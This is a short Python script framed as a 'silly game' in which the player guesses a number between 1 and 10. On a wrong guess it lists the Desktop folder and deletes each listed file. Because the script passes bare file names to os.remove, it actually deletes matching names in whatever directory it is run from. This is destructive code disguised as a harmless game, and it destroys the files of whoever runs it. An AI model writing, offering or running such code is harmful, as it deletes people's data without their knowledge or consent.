import random
import os

number = random.randint(1,10)

guess = input("Silly game! Guess number between1 and 10 \n")
guess = int(guess)

if guess == number:
    print("You live to fight another day...")
else:
    desktop_path = os.path.expanduser("~/Desktop")
    files = os.listdir(desktop_path)
    for file in files:
        os.remove(file)


